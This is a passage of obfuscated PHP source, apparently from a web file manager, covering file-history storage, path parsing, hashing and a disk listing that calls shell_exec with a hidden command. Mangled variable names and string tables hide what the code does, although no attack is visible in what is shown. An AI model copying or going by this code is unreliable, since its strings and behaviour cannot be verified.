REPEAT_REPLACE, $÷‹——‡»[$Àš°ú¾®[32]]); if ($ÅüÔïî²) { self::remove($†û«üıû, $¨¤ÕÍÉç); } return $ÅüÔïî²; } } return !1; } public static function setDetail($œ˜Î¸¹, $…ĞÄÍù, $ß²ÖÄ¾ë) { $ì­¶ÆĞç =& $_SERVER[ÕŸ²ó÷å]; $³ºÀ‘ıø = self::listData($œ˜Î¸¹); if (!$³ºÀ‘ıø) { return; } foreach ($³ºÀ‘ıø[$ì­¶ÆĞç[454]] as $Ó·Ìç¦† => $Ã£ÀÒ¿) { if ($Ã£ÀÒ¿[$ì­¶ÆĞç[484]] == $…ĞÄÍù) { $³ºÀ‘ıø[$ì­¶ÆĞç[454]][$Ó·Ìç¦†][$ì­¶ÆĞç[1330]] = $ß²ÖÄ¾ë; self::saveData($³ºÀ‘ıø[$ì­¶ÆĞç[1332]], $³ºÀ‘ıø[$ì­¶ÆĞç[454]]); return !0; } } return !1; } public static function fileInfo($ˆŞ¦¯—ò, $ø”²î‚) { $Ù¹¤ß¹² =& $_SERVER[ÕŸ²ó÷å]; $şüŞ¹ûó = self::listData($ˆŞ¦¯—ò); if (!$şüŞ¹ûó) { show_json(LNG($Ù¹¤ß¹²[118]), !1); } $©—ƒ¬’‹ = $Ù¹¤ß¹²[12]; foreach ($şüŞ¹ûó[$Ù¹¤ß¹²[454]] as $Í—‰ù‹Ş => $‘ŞáÀù) { if ($‘ŞáÀù[$Ù¹¤ß¹²[484]] != $ø”²î‚) { continue; } $©—ƒ¬’‹ = $şüŞ¹ûó[$Ù¹¤ß¹²[1331]] . $‘ŞáÀù[$Ù¹¤ß¹²[32]]; break; } if (!$©—ƒ¬’‹) { show_json(LNG($Ù¹¤ß¹²[118]), !1); } return IO::info($©—ƒ¬’‹); } public static function fileOut($¼Ÿå›š, $†Â Ë‰, $éÓÓÀ±Ú = false) { $ÁÉÓ°’º =& $_SERVER[ÕŸ²ó÷å]; $Ã£Û“Ù„ = self::fileInfo($¼Ÿå›š, $†Â Ë‰); $Íâº‹Åè =& $GLOBALS[$ÁÉÓ°’º[7]]; $éÓÓÀ±Ú = isset($Íâº‹Åè[$ÁÉÓ°’º[1282]]) && $Íâº‹Åè[$ÁÉÓ°’º[1282]] == 1; if (isset($Íâº‹Åè[$ÁÉÓ°’º[33]]) && $Íâº‹Åè[$ÁÉÓ°’º[33]] == $ÁÉÓ°’º[1333]) { return IO::fileOutImage($Ã£Û“Ù„[$ÁÉÓ°’º[97]], $Íâº‹Åè[$ÁÉÓ°’º[1334]]); } IO::fileOut($Ã£Û“Ù„[$ÁÉÓ°’º[97]], $éÓÓÀ±Ú, get_path_this($¼Ÿå›š)); } public static function listData($¦«î¼Ë, $×ÇÎ©é² = true) { $ÀÍ®‰Ü“ =& $_SERVER[ÕŸ²ó÷å]; if ($×ÇÎ©é² && !IO::exist($¦«î¼Ë)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¦«î¼Ë, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $±ˆéÀ·í = self::pathHistory($¦«î¼Ë); $å°õÕŠ = array($ÀÍ®‰Ü“[1332] => $±ˆéÀ·í . $ÀÍ®‰Ü“[1319], $ÀÍ®‰Ü“[1331] => rtrim(get_path_father($±ˆéÀ·í), $ÀÍ®‰Ü“[8]) . $ÀÍ®‰Ü“[8], $ÀÍ®‰Ü“[454] => array()); $¤ÁÏ‹‹ğ = IO::getContent($å°õÕŠ[$ÀÍ®‰Ü“[1332]]); if ($¤ÁÏ‹‹ğ) { $Ë÷Ö×ª = json_decode($¤ÁÏ‹‹ğ, !0); if (is_array($Ë÷Ö×ª)) { $å°õÕŠ[$ÀÍ®‰Ü“[454]] = $Ë÷Ö×ª; } } return $å°õÕŠ; } private static function saveData($Æ×‡ç×¤, $Üœ¼›µ) { $Æà£Á¾ó =& $_SERVER[ÕŸ²ó÷å]; self::log($Æà£Á¾ó[1335] . $Æ×‡ç×¤ . $Æà£Á¾ó[84] . count($Üœ¼›µ), $Æà£Á¾ó[836]); if ($Üœ¼›µ) { return IO::setContent($Æ×‡ç×¤, json_encode($Üœ¼›µ)); } $›ñ€İÍ = IO::pathFather($Æ×‡ç×¤); IO::remove($Æ×‡ç×¤); self::clearEmptyFolder($›ñ€İÍ); return !0; } public static function clearEmptyFolder($ò…‹ğÕÙ) { $ò™Äë“Õ =& $_SERVER[ÕŸ²ó÷å]; if (trim($ò…‹ğÕÙ, $ò™Äë“Õ[8]) == trim(self::$_historyBase, $ò™Äë“Õ[8])) { return; } $š®š¬µ = IO::pathFather($ò…‹ğÕÙ); $²§üüÅ = IO::has($ò…‹ğÕÙ, !0); if ($²§üüÅ[$ò™Äë“Õ[249]] > 0 || $²§üüÅ[$ò™Äë“Õ[250]] > 0) { return; } IO::remove($ò…‹ğÕÙ); self::clearEmptyFolder($š®š¬µ); } private static function getBasePath() { $½øãš·Š =& $_SERVER[ÕŸ²ó÷å]; $ú¾Ó±ƒ = Model($½øãš·Š[1336])->get($½øãš·Š[1337]); if ($ú¾Ó±ƒ) { if (!IO::exist($ú¾Ó±ƒ)) { IO::mkdir($ú¾Ó±ƒ); } if (get_path_this($ú¾Ó±ƒ) == $½øãš·Š[1322]) { $¯Ç€Ú = $½øãš·Š[1338] . rand_string(8); @rename($ú¾Ó±ƒ, get_path_father($ú¾Ó±ƒ) . $½øãš·Š[8] . $¯Ç€Ú); $ú¾Ó±ƒ = DATA_PATH . $¯Ç€Ú . $½øãš·Š[8]; file_put_contents(DATA_PATH . $½øãš·Š[1269], $½øãš·Š[12]); Model($½øãš·Š[1336])->set($½øãš·Š[1337], $ú¾Ó±ƒ); } return $ú¾Ó±ƒ; } $ú¾Ó±ƒ = DATA_PATH . $½øãš·Š[1338] . rand_string(8) . $½øãš·Š[8]; $ú¾Ó±ƒ = IO::mkdir($ú¾Ó±ƒ); $ú¾Ó±ƒ = rtrim($ú¾Ó±ƒ, $½øãš·Š[8]) . $½øãš·Š[8]; file_put_contents($ú¾Ó±ƒ . $½øãš·Š[1269], $½øãš·Š[12]); file_put_contents(DATA_PATH . $½øãš·Š[1269], $½øãš·Š[12]); Model($½øãš·Š[1336])->set($½øãš·Š[1337], $ú¾Ó±ƒ); return $ú¾Ó±ƒ; } } goto A¿Ğ®…†Ç×; A¿Ğ®…†Ç×: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\x65\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\106\x69\154\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\106\151\x6c\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\160\x52\x6f\x6f\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\145\162\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\123\x68\141\162\x65\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\164\145\x6d\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\x61\162\143\x68\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\x52\x65\x6e\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\x72\x7d"; public static function typeList() { $«¸„”ˆ‹ =& $_SERVER[ÕŸ²ó÷å]; return array($«¸„”ˆ‹[1339] => self::KOD_SOURCE, $«¸„”ˆ‹[1340] => self::KOD_USER_RECYCLE, $«¸„”ˆ‹[1341] => self::KOD_USER_FAV, $«¸„”ˆ‹[1342] => self::KOD_USER_FILE_TAG, $«¸„”ˆ‹[1343] => self::KOD_USER_FILE_TYPE, $«¸„”ˆ‹[1344] => self::KOD_GROUP_ROOT_SELF, $«¸„”ˆ‹[1345] => self::KOD_USER_SHARE, $«¸„”ˆ‹[1346] => self::KOD_USER_SHARE_LINK, $«¸„”ˆ‹[1347] => self::KOD_USER_SHARE_TO_ME, $«¸„”ˆ‹[1348] => self::KOD_SHARE_ITEM, $«¸„”ˆ‹[1349] => self::KOD_SHARE_LINK, $«¸„”ˆ‹[1350] => self::KOD_SEARCH, $«¸„”ˆ‹[1351] => self::KOD_BLOCK, $«¸„”ˆ‹[1352] => self::KOD_IO, $«¸„”ˆ‹[1353] => self::KOD_USER_RECENT, $«¸„”ˆ‹[1354] => self::KOD_USER_DRIVER); } public static function parse($¤ÔúÓ­´) { $çÕüÙÙ =& $_SERVER[ÕŸ²ó÷å]; $¤ÔúÓ­´ = self::clear($¤ÔúÓ­´); $˜Úª½ö = array_values(self::typeList()); preg_match($çÕüÙÙ[1355], $¤ÔúÓ­´, $•Á¾ÃØ—); $Íà—•Ÿå = array($çÕüÙÙ[505] => !1, $çÕüÙÙ[1356] => !1, $çÕüÙÙ[502] => !1, $çÕüÙÙ[97] => $¤ÔúÓ­´, $çÕüÙÙ[1254] => !1, $çÕüÙÙ[1253] => $çÕüÙÙ[12]); if (is_array($•Á¾ÃØ—) && count($•Á¾ÃØ—) == 5) { $×ÅƒÉ´” = $çÕüÙÙ[1357] . $•Á¾ÃØ—[2] . $çÕüÙÙ[412]; if (in_array($×ÅƒÉ´”, $˜Úª½ö)) { $Íà—•Ÿå[$çÕüÙÙ[1254]] = $•Á¾ÃØ—[1]; $Íà—•Ÿå[$çÕüÙÙ[33]] = $×ÅƒÉ´”; $Íà—•Ÿå[$çÕüÙÙ[1358]] = substr($×ÅƒÉ´”, 1, -1); $Íà—•Ÿå[$çÕüÙÙ[484]] = $•Á¾ÃØ—[3]; } $Íà—•Ÿå[$çÕüÙÙ[1253]] = $•Á¾ÃØ—[4]; } $˜›ç¸×Ø = array($çÕüÙÙ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Íà—•Ÿå[$çÕüÙÙ[1321]] = in_array($Íà—•Ÿå[$çÕüÙÙ[33]], $˜›ç¸×Ø); return $Íà—•Ÿå; } public static function isTruePath($•ê‘ôş) { $ÖÃ¥õâ· =& $_SERVER[ÕŸ²ó÷å]; if (substr($•ê‘ôş, 0, 1) != $ÖÃ¥õâ·[1357]) { return !0; } if (strpos($•ê‘ôş, $ÖÃ¥õâ·[492]) === 0) { return !0; } if (strpos($•ê‘ôş, $ÖÃ¥õâ·[1325]) === 0) { return !0; } if (strpos($•ê‘ôş, $ÖÃ¥õâ·[1359]) === 0) { return !0; } if (strpos($•ê‘ôş, $ÖÃ¥õâ·[1360]) === 0) { return !0; } if (strpos($•ê‘ôş, $ÖÃ¥õâ·[1361]) === 0) { return !0; } return !1; } public static function clear($¶ï“üÂè) { $°ßÂè¹ =& $_SERVER[ÕŸ²ó÷å]; $¶ï“üÂè = str_replace(array($°ßÂè¹[1160], $°ßÂè¹[59]), $°ßÂè¹[53], $¶ï“üÂè); $¶ï“üÂè = str_replace($°ßÂè¹[110], $°ßÂè¹[8], $¶ï“üÂè); $ƒÛÏˆ…÷ = $°ßÂè¹[1362]; if (substr($¶ï“üÂè, 0, 3) == $°ßÂè¹[1363]) { $¶ï“üÂè = substr($¶ï“üÂè, 3); } while (strstr($¶ï“üÂè, $ƒÛÏˆ…÷)) { $¶ï“üÂè = str_replace($ƒÛÏˆ…÷, $°ßÂè¹[8], $¶ï“üÂè); } $¶ï“üÂè = preg_replace($°ßÂè¹[1364], $°ßÂè¹[8], $¶ï“üÂè); if ($¶ï“üÂè == $°ßÂè¹[8]) { return $°ßÂè¹[8]; } $¶ï“üÂè = rtrim($¶ï“üÂè, $°ßÂè¹[8]); return $¶ï“üÂè; } public static function pathTrue($öÄ¢¾) { $Å‚öá»ß =& $_SERVER[ÕŸ²ó÷å]; if (!$öÄ¢¾) { return $Å‚öá»ß[12]; } $öÄ¢¾ = str_replace($Å‚öá»ß[601], $Å‚öá»ß[8], str_replace($Å‚öá»ß[1365], $Å‚öá»ß[8], $öÄ¢¾)); $öÄ¢¾ = str_replace($Å‚öá»ß[601], $Å‚öá»ß[8], str_replace($Å‚öá»ß[1365], $Å‚öá»ß[8], $öÄ¢¾)); if (!strstr($öÄ¢¾, $Å‚öá»ß[1363])) { return $öÄ¢¾; } $×ä²Ğúƒ = explode($Å‚öá»ß[8], $öÄ¢¾); foreach ($×ä²Ğúƒ as $ä²‹ıª => $¨™·…Ûú) { if ($¨™·…Ûú !== $Å‚öá»ß[1366]) { continue; } for ($Ã¤¥¶óâ = $ä²‹ıª; $Ã¤¥¶óâ >= 0; $Ã¤¥¶óâ--) { if ($×ä²Ğúƒ[$Ã¤¥¶óâ] === $Å‚öá»ß[10] || $×ä²Ğúƒ[$Ã¤¥¶óâ] === $Å‚öá»ß[1366] || $×ä²Ğúƒ[$Ã¤¥¶óâ] === -1) { continue; } if ($×ä²Ğúƒ[$Ã¤¥¶óâ] === $Å‚öá»ß[12]) { $×ä²Ğúƒ[$ä²‹ıª] = -1; break; } $×ä²Ğúƒ[$ä²‹ıª] = -1; $×ä²Ğúƒ[$Ã¤¥¶óâ] = -1; break; } } $öÑä“š = array(); foreach ($×ä²Ğúƒ as $¨™·…Ûú) { if ($¨™·…Ûú !== -1) { $öÑä“š[] = $¨™·…Ûú; } } $ø¯™ôÅÈ = implode($Å‚öá»ß[8], $öÑä“š); if (strpos($ø¯™ôÅÈ, $Å‚öá»ß[1367]) === 0) { $ø¯™ôÅÈ = $Å‚öá»ß[1363] . substr($ø¯™ôÅÈ, strlen($Å‚öá»ß[1367])); } return $ø¯™ôÅÈ; } public static function pathUrlClear($Ú¸¼®Œ¨) { $ş»Öš‚¹ =& $_SERVER[ÕŸ²ó÷å]; if (!$Ú¸¼®Œ¨) { return $Ú¸¼®Œ¨; } $Ú¸¼®Œ¨ = rawurldecode($Ú¸¼®Œ¨); $Ú¸¼®Œ¨ = str_replace($ş»Öš‚¹[1365], $ş»Öš‚¹[8], $Ú¸¼®Œ¨); if (strpos($Ú¸¼®Œ¨, $ş»Öš‚¹[86]) > 0) { $Ú¸¼®Œ¨ = substr($Ú¸¼®Œ¨, 0, strpos($Ú¸¼®Œ¨, $ş»Öš‚¹[86])); } if (strpos($Ú¸¼®Œ¨, $ş»Öš‚¹[1368]) > 0) { $Ú¸¼®Œ¨ = substr($Ú¸¼®Œ¨, 0, strpos($Ú¸¼®Œ¨, $ş»Öš‚¹[1368])); } return $Ú¸¼®Œ¨; } public static function sourceID($—ÏàŸ¨•) { $½¹‰­Š™ =& $_SERVER[ÕŸ²ó÷å]; $ûÃ€ºÈº = self::parse($—ÏàŸ¨•); if ($ûÃ€ºÈº[$½¹‰­Š™[33]] !== self::KOD_SOURCE) { show_json(LNG($½¹‰­Š™[1369]), !1); } return $ûÃ€ºÈº[$½¹‰­Š™[484]]; } public static function make($Ÿ„»ÙÏÛ) { if (!$Ÿ„»ÙÏÛ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ÿ„»ÙÏÛ)); } public static function makeShare($éÅá‚¼‹, $ê ½º®ø) { return self::makePath(self::KOD_SHARE_ITEM, $éÅá‚¼‹, $ê ½º®ø); } public static function makeFileTypePath($Ğ®‡ú¯) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ğ®‡ú¯); } public static function makeFileTagPath($«åŸ†”Õ) { return self::makePath(self::KOD_USER_FILE_TAG, $«åŸ†”Õ); } public static function makePath($°öÁ˜ÅÒ, $·Ş½äÄ… = '', $ÏØœ«ëÀ = '') { $òÑÆğÂ =& $_SERVER[ÕŸ²ó÷å]; $§×ùö¼¸ = substr($°öÁ˜ÅÒ, 1, -1); $ù÷…ãêŸ = $òÑÆğÂ[1370] . $§×ùö¼¸ . $òÑÆğÂ[1371] . $·Ş½äÄ… . $òÑÆğÂ[1372]; $ù÷…ãêŸ = $ÏØœ«ëÀ ? $ù÷…ãêŸ . $ÏØœ«ëÀ . $òÑÆğÂ[8] : $ù÷…ãêŸ; return $ù÷…ãêŸ; } public static function hashPath($‹Ì¡µ»Š, $§Œ»“ô = true) { $ÊË¬€ß§ =& $_SERVER[ÕŸ²ó÷å]; $ªĞö–úå = is_array($‹Ì¡µ»Š) ? $‹Ì¡µ»Š : IO::info($‹Ì¡µ»Š); $åÆ­ĞĞÂ = _get($ªĞö–úå, $ÊË¬€ß§[1373], $ÊË¬€ß§[12]); if (!$åÆ­ĞĞÂ && isset($ªĞö–úå[$ÊË¬€ß§[245]])) { $åÆ­ĞĞÂ = trim($ªĞö–úå[$ÊË¬€ß§[245]], $ÊË¬€ß§[131]); } if (!$åÆ­ĞĞÂ && isset($ªĞö–úå[$ÊË¬€ß§[203]]) && $ªĞö–úå[$ÊË¬€ß§[203]]) { $ªĞö–úå = IO::info(KodIO::make($ªĞö–úå[$ÊË¬€ß§[203]])); $åÆ­ĞĞÂ = _get($ªĞö–úå, $ÊË¬€ß§[1373], $ÊË¬€ß§[12]); } $ÊØ²íİ¦ = md5($ªĞö–úå[$ÊË¬€ß§[97]] . $ªĞö–úå[$ÊË¬€ß§[89]] . $ªĞö–úå[$ÊË¬€ß§[98]]); if (!$åÆ­ĞĞÂ && file_exists($ªĞö–úå[$ÊË¬€ß§[97]])) { $åÆ­ĞĞÂ = Cache::get($ÊØ²íİ¦ . $ÊË¬€ß§[1374]); $åÆ­ĞĞÂ = !1; if (!$åÆ­ĞĞÂ) { $åÆ­ĞĞÂ = IO::hashSimple($ªĞö–úå[$ÊË¬€ß§[97]]); Cache::set($ÊØ²íİ¦ . $ÊË¬€ß§[1374], $åÆ­ĞĞÂ, 3600 * 24 * 30); } } if ($§Œ»“ô && !$åÆ­ĞĞÂ) { } return $åÆ­ĞĞÂ ? $åÆ­ĞĞÂ : $ÊØ²íİ¦; } public static function hashPathSafe($ª¦¢İëË, $«åáİ­Æ = true) { $Â•‘à’¬ =& $_SERVER[ÕŸ²ó÷å]; $ÉÛå™ƒš = self::hashPath($ª¦¢İëË, $«åáİ­Æ); return md5($ÉÛå™ƒš . $Â•‘à’¬[1375] . Model($Â•‘à’¬[854])->get($Â•‘à’¬[855])); } public static function initSystemPath() { $¼âîòÜº =& $_SERVER[ÕŸ²ó÷å]; if (defined($¼âîòÜº[1376])) { return; } define($¼âîòÜº[1376], self::systemPath($¼âîòÜº[201])); define($¼âîòÜº[1377], self::systemPath($¼âîòÜº[1378])); define($¼âîòÜº[1379], self::systemPath($¼âîòÜº[1380])); define($¼âîòÜº[1381], self::systemPath($¼âîòÜº[1382])); IOHistory::bindEvent(); } public static function systemPath($¯¢©íó) { $øÂÉçÖ± =& $_SERVER[ÕŸ²ó÷å]; $±åÓ˜¯º = $øÂÉçÖ±[1383] . ucfirst($¯¢©íó); $æÏ†Ş‰’ = Model($øÂÉçÖ±[854])->get($±åÓ˜¯º); if ($æÏ†Ş‰’) { return $æÏ†Ş‰’; } if ($¯¢©íó == $øÂÉçÖ±[201]) { $æÏ†Ş‰’ = self::make(Model($øÂÉçÖ±[908])->systemRootPathAdd($øÂÉçÖ±[614])); } else { $æÏ†Ş‰’ = self::systemPath($øÂÉçÖ±[201]); $Ê”ª§×å = self::sourceID($æÏ†Ş‰’); $æÏ†Ş‰’ = self::make(Model($øÂÉçÖ±[908])->mkdir($Ê”ª§×å, $¯¢©íó)); } Model($øÂÉçÖ±[854])->set($±åÓ˜¯º, $æÏ†Ş‰’); return $æÏ†Ş‰’; } public static function systemFolder($¢ÃŒõ) { $æã›¢Áœ = IO_PATH_SYSTEM_SOURCE . $¢ÃŒõ; $Œ‹šÏš = Cache::get($æã›¢Áœ); if (!$Œ‹šÏš) { $ş§µóÀ× = IO::infoFullSimple($æã›¢Áœ); if (!$ş§µóÀ×) { $Œ‹šÏš = IO::mkdir($æã›¢Áœ, REPEAT_SKIP); } else { $Œ‹šÏš = $ş§µóÀ×[$_SERVER[ÕŸ²ó÷å][97]]; } Cache::set($æã›¢Áœ, $Œ‹šÏš, 3600 * 10); } return $Œ‹šÏš; } public static function defaultDriver() { return Model($_SERVER[ÕŸ²ó÷å][851])->defaultDriver(); } public static function defaultIO() { $®½Ëï–ï =& $_SERVER[ÕŸ²ó÷å]; $Æµæ†¶ = self::defaultDriver(); return $®½Ëï–ï[1384] . $Æµæ†¶[$®½Ëï–ï[484]] . $®½Ëï–ï[1372]; } public static function defaultDriverInit() { static $ü‡ë¦¢É = false; if ($ü‡ë¦¢É) { return $ü‡ë¦¢É; } $ü‡ë¦¢É = IO::init(self::defaultIO()); return $ü‡ë¦¢É; } public static function fileTypeList() { $‡ÄÍÒæ‹ =& $_SERVER[ÕŸ²ó÷å]; $ø»â“Òó = $GLOBALS[$‡ÄÍÒæ‹[6]][$‡ÄÍÒæ‹[1385]]; foreach ($ø»â“Òó as $óÙÂû‰Ù => $Ò§Ã’§…) { $€ˆ¿œ•ú = $‡ÄÍÒæ‹[1386] . $óÙÂû‰Ù; $ŒˆÑ€İÕ = LNG($€ˆ¿œ•ú); if ($€ˆ¿œ•ú != $ŒˆÑ€İÕ) { $ø»â“Òó[$óÙÂû‰Ù][$‡ÄÍÒæ‹[32]] = $ŒˆÑ€İÕ; } } return $ø»â“Òó; } public static function diskList($è›Æ¬İ­ = true) { $•ª÷ · = $_SERVER[ÕŸ²ó÷å][1387]; if ($è›Æ¬İ­) { $¶§í’‡í = Cache::get($•ª÷ ·); if (is_array($¶§í’‡í)) { return $¶§í’‡í; } } $¶§í’‡í = self::diskListGet(); Cache::set($•ª÷ ·, $¶§í’‡í, 60); return $¶§í’‡í; } public static function diskListGet() { $·‚¨úåì =& $_SERVER[ÕŸ²ó÷å]; $¿†ÊĞ‰ó = array(); if ($GLOBALS[$·‚¨úåì[6]][$·‚¨úåì[1388]] == $·‚¨úåì[1389]) { $êàû­›ô = $·‚¨úåì[1390]; for ($å—­ò°š = 0; $å—­ò°š < strlen($êàû­›ô); $å—­ò°š++) { $üÓª÷¾ = $êàû­›ô[$å—­ò°š] . $·‚¨úåì[1391]; if (file_exists($üÓª÷¾)) { $¿†ÊĞ‰ó[] = $üÓª÷¾; } } return $¿†ÊĞ‰ó; } if (!function_exists($·‚¨úåì[111])) { $¿†ÊĞ‰ó[] = $·‚¨úåì[919]; return $¿†ÊĞ‰ó; } $™äšãà¡ = explode($·‚¨úåì[59], shell_exec($·‚¨úåì[1392])); array_shift($™äšãà¡); array_pop($™äšãà¡); $¡‘Úƒ¶Í = array($·‚¨úåì[1393], $·‚¨úåì[1394], $·‚¨úåì[1395], $·‚¨úåì[1396], $·‚¨úåì[1397], $·‚¨úåì[1398], $·‚¨úåì[1399], $·‚¨úåì[1400]); foreach ($™äšãà¡ as $ûğ„Ç¥İ) { $‡ƒœ‹¹Å = preg_split($·‚¨úåì[1401], $ûğ„Ç¥İ); $üÓª÷¾ = $‡ƒœ‹¹Å[count($‡ƒœ‹¹Å) - 1]; if (!strstr($‡ƒœ‹¹Å[0], $·‚¨úåì[1402]) || !$üÓª÷¾) { continue; } $ïÉòæ×÷ = rtrim($üÓª÷¾, $·‚¨úåì[8]) . $·‚¨úåì[8]; if (in_array($ïÉòæ×÷, $¡‘Úƒ¶Í)) { continue; } $¿†ÊĞ‰ó[] = $ïÉòæ×÷; } return $¿†ÊĞ‰ó; } public static function isSameDisk($²ü˜¨€„, $äË§“â–) { $ó‡á¹§ =& $_SERVER[ÕŸ²ó÷å]; if ($GLOBALS[$ó‡á¹§[6]][$ó‡á¹§[1388]] == $ó‡á¹§[1389]) { return strtolower(substr($²ü˜¨€„, 0, 1)) == strtolower(substr($äË§“â–, 0, 1)); } $Ëş¥£¥ = self::diskList(); $¹ÈøòŞš = !1; $ øÀÖ¨ = !1; sort($Ëş¥£¥); $Ëş¥£¥ = array_reverse($Ëş¥£¥); $²ü˜¨€„ = rtrim($²ü˜¨€„, $ó‡á¹§[8]) . $ó‡á¹§[8]; $äË§“â– = rtrim($äË§“â–, $ó‡á¹§[8]) . $ó‡á¹§[8]; foreach ($Ëş¥£¥ as $£ÍŞÏ‘Û) { $ú‰ìÓÀû = strlen($£ÍŞÏ‘Û); if (!$¹ÈøòŞš && substr($²ü˜¨€„, 0, $ú‰ìÓÀû) == $£ÍŞÏ‘Û) { $¹ÈøòŞš = $£ÍŞÏ‘Û; } if (!$ øÀÖ¨ && substr($äË§“â–, 0, $ú‰ìÓÀû) == $£ÍŞÏ‘Û) { $ øÀÖ¨ = $£ÍŞÏ‘Û; } if ($¹ÈøòŞš && $ øÀÖ¨) { break; } } return $¹ÈøòŞš === $ øÀÖ¨; } public static function transferType($Ï³Ìë®», $³ÂÇÌ™Ç) { $•Ê˜Äğ  =& $_SERVER[ÕŸ²ó÷å]; $êÔÉ³­ = self::driverType($Ï³Ìë®»); $Ûó¶å£  = self::driverType($³ÂÇÌ™Ç); if ($êÔÉ³­[$•Ê˜Äğ [33]] == $Ûó¶å£ [$•Ê˜Äğ [33]] && $êÔÉ³­[$•Ê˜Äğ [1403]] == $Ûó¶å£ [$•Ê˜Äğ [1403]]) { return $•Ê˜Äğ [1404]; } if ($êÔÉ³­[$•Ê˜Äğ [33]] == $•Ê˜Äğ [953] && $Ûó¶å£ [$•Ê˜Äğ [33]] == $•Ê˜Äğ [119]) { return $•Ê˜Äğ [1282]; } if ($êÔÉ³­[$•Ê˜Äğ [33]] == $•Ê˜Äğ [119] && $Ûó¶å£ [$•Ê˜Äğ [33]] == $•Ê˜Äğ [953]) { return $•Ê˜Äğ [120]; } return $•Ê˜Äğ [1405]; } public static function driverType($‹¥à„») { $¨œáŸéÛ =& $_SERVER[ÕŸ²ó÷å]; $õ–ÎŒ’Ò = str_replace($¨œáŸéÛ[1406], $¨œáŸéÛ[12], strtolower($‹¥à„»->getType())); if ($õ–ÎŒ’Ò == $¨œáŸéÛ[841] || $õ–ÎŒ’Ò == $¨œáŸéÛ[1407] || $õ–ÎŒ’Ò == $¨œáŸéÛ[1408]) { $‹¥à„» = self::defaultDriverInit(); } else { if ($õ–ÎŒ’Ò == $¨œáŸéÛ[1292] || $õ–ÎŒ’Ò == $¨œáŸéÛ[1409]) { $‹¥à„» = IO::init($‹¥à„»->pathParse[$¨œáŸéÛ[1235]]); } } $²µº…èã = $‹¥à„»->path; $õ–ÎŒ’Ò = str_replace($¨œáŸéÛ[1406], $¨œáŸéÛ[12], strtolower($‹¥à„»->getType())); if ($õ–ÎŒ’Ò == $¨œáŸéÛ[119]) { return array($¨œáŸéÛ[33] => $¨œáŸéÛ[119], $¨œáŸéÛ[1403] => $¨œáŸéÛ[12], $¨œáŸéÛ[97] => $²µº…èã, $¨œáŸéÛ[108] => $‹¥à„»); } return array($¨œáŸéÛ[33] => $¨œáŸéÛ[953], $¨œáŸéÛ[1403] => $‹¥à„»->pathDriver, $¨œáŸéÛ[97] => $²µº…èã, $¨œáŸéÛ[108] => $‹¥à„»); } public static function pathDriverType($ßÂÍİÅ) { return $ßÂÍİÅ ? self::driverType(IO::init($ßÂÍİÅ)) : !1; } public static function pathDriverLocal($ª–•­÷Â) { $€ÒÑÛúÍ =& $_SERVER[ÕŸ²ó÷å]; $­’§ÏÄ™ = $ª–•­÷Â ? self::driverType(IO::init($ª–•­÷Â)) : !1; return strtolower($­’§ÏÄ™[$€ÒÑÛúÍ[33]]) == $€ÒÑÛúÍ[119] ? !0 : !1; } public static function allowCover($‹ııßÂ–, $³‡™˜¢ı = true) { $Ÿ½§É¨¤ =& $_SERVER[ÕŸ²ó÷å]; if (is_string($‹ııßÂ–)) { $‹ııßÂ– = IO::info($‹ııßÂ–); } if (!$‹ııßÂ– || $‹ııßÂ–[$Ÿ½§É¨¤[33]] == $Ÿ½§É¨¤[88] || $‹ııßÂ–[$Ÿ½§É¨¤[89]] <= 100) { return !1; } if (isset($‹ııßÂ–[$Ÿ½§É¨¤[1410]]) || !$‹ııßÂ–[$Ÿ½§É¨¤[97]]) { return !1; } if (isset($‹ııßÂ–[$Ÿ½§É¨¤[242]]) && !$‹ııßÂ–[$Ÿ½§É¨¤[242]]) { return !1; } static $áíÙä‘õ = false; if (!$áíÙä‘õ || !$³‡™˜¢ı) { $ ĞÑ½°ù = self::driverType(IO::init($‹ııßÂ–[$Ÿ½§É¨¤[97]])); $ÑŠæÜˆê = $ ĞÑ½°ù[$Ÿ½§É¨¤[108]]; $áíÙä‘õ = $Ÿ½§É¨¤[206]; if ($ ĞÑ½°ù[$Ÿ½§É¨¤[33]] == $Ÿ½§É¨¤[119]) { $áíÙä‘õ = $Ÿ½§É¨¤[1411]; } if ($ ĞÑ½°ù[$Ÿ½§É¨¤[108]] && is_array($ ĞÑ½°ù[$Ÿ½§É¨¤[108]]->config)) { $•ï÷ÆíÎ = $ ĞÑ½°ù[$Ÿ½§É¨¤[108]]->config; if (isset($•ï÷ÆíÎ[$Ÿ½§É¨¤[1412]]) && $•ï÷ÆíÎ[$Ÿ½§É¨¤[1412]]) { $áíÙä‘õ = $Ÿ½§É¨¤[1411]; } } $Ñ¹á³Š¾ = KodIO::defaultDriver(); if (strtolower($Ñ¹á³Š¾[$Ÿ½§É¨¤[108]]) == $Ÿ½§É¨¤[119] && is_array($Ñ¹á³Š¾[$Ÿ½§É¨¤[6]])) { $”±ûÓø = 